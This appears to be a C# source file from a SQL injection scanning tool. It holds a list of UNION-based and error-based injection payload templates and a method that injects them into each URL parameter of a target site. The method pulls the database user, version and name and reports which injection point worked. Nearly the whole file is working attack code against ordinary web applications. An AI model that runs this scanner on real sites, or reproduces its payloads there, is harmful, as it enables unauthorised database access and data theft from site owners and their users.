using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SQl_SCanner
{
    class Sqli_analyse
    {
        private MainForm form_principale = GlobalVar.form;
        private List<string> _param = new List<string> { };
        private const string baseI = "(select 1 from(select count(*),concat((select (select [t]) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";
        private string separateur = "!~!";
        private string s_separateur = "'~!'";
        private string _url_originale;
        private string _url_base;
        private int _nbr_colonne;
        private int _colonne_point;
        private chaine ch = new chaine();
        private List<string> _unionStyle = new List<string> 
        {
            "999999.9 union all select [t]",
            "999999.9 union all select [t]--",
            "999999.9' union all select [t] and '0'='0",
            "999999.9\" union all select [t] and \"0\"=\"0",
            "999999.9) union all select [t] and (0=0",
            "9' and [t] '1'=1",
            "9' or 1=[t] and '1'=1",
            "999999.9 union all select [t] #",
            "999999.9 union all select [t]-- #",
            "999999.9\" union all select [t] and \"0\"=\"0 #",
            "999999.9' union all select [t] and '0'='0 #",
            "999999.9) union all select [t] and (0=0) #",
        };

        public string Analyse(string url)
        {
            checked
            {
                HttpRequete hr = new HttpRequete();
                sqli_check vrf = new sqli_check();
                sqli_colonne colonne = new sqli_colonne();
                string url_inj_point = string.Empty;
                string inj_point_curr = string.Empty;
                bool point_trv = false;
                _url_originale = url;
                _url_base = url.Split('?')[0];
                _param = ch.analyseParam(url);
                
                int u = 0; //Union Style 1
                while (!point_trv && u < _unionStyle.Count)
                {
                    _nbr_colonne = colonne.Compter(_param, _url_base, _unionStyle[u]);
                    for (int p = 0; p < _param.Count; p++)
                    {
                        _colonne_point = colonne.FindColonneVise(_url_base + ch.escapeParam(ch.genParamParIndex(_param, 0, p + 1)) + _unionStyle[u].Replace("[t]", ch.genNbrColonneVise(_nbr_colonne, _colonne_point)) + ch.genParamParIndex(_param, p + 1, _param.Count), _nbr_colonne);

                        url_inj_point = _url_base + ch.escapeParam(ch.genParamParIndex(_param, 0, p + 1)) + _unionStyle[u].Replace("[t]", ch.genNbrColonneVise(_nbr_colonne, _colonne_point)) + ch.genParamParIndex(_param, p + 1, _param.Count);

                        inj_point_curr = url_inj_point.Replace("[t]", ch.Encode("concat(" + ch.getHex(separateur) + ",concat(user()," + ch.getHex(s_separateur) + ",version()," + ch.getHex(s_separateur) + ",database())," + ch.getHex(separateur) + ")"));

                        string page = hr.get(inj_point_curr);
                        if (page.Contains(separateur) || page.Contains(s_separateur))
                        {
                            return url_inj_point;
                        }
                    }
                    u++;
                }
                return "False";
            }
        }


        //CHEMIN SEPARER EN FONCTION:
        //STRING COMPARE ET EXTRAIRE lA COLONNE VISE 
    }
}
